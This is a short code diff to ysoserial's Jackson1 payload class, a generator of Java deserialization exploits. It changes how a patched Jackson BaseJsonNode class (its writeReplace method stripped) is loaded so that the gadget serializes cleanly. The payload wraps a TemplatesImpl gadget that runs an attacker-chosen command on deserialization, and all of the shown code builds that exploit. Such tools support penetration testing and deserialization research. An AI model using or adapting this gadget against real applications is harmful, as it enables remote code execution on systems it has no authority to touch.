@@ -1,7 +1,6 @@
 package ysoserial.payloads;
 
 import com.fasterxml.jackson.databind.node.POJONode;
-import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 import ysoserial.payloads.annotation.Authors;
@@ -25,11 +24,11 @@ public class Jackson1 implements ObjectPayload<Object> {
     public Object getObject(final String command) throws Exception {
         final Object template = Gadgets.createTemplatesImpl(command);
 
-        CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+        CtClass ctClass = Gadgets.getClassPool().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
         CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
         ctClass.removeMethod(writeReplace);
-        // 将修改后的CtClass加载至当前线程的上下文类加载器中
-        ctClass.toClass();
+        ClassLoader payloadClassLoader = Jackson1.class.getClassLoader();
+        ctClass.toClass(payloadClassLoader, Jackson1.class.getProtectionDomain());
 
         POJONode node = new POJONode(template);
 
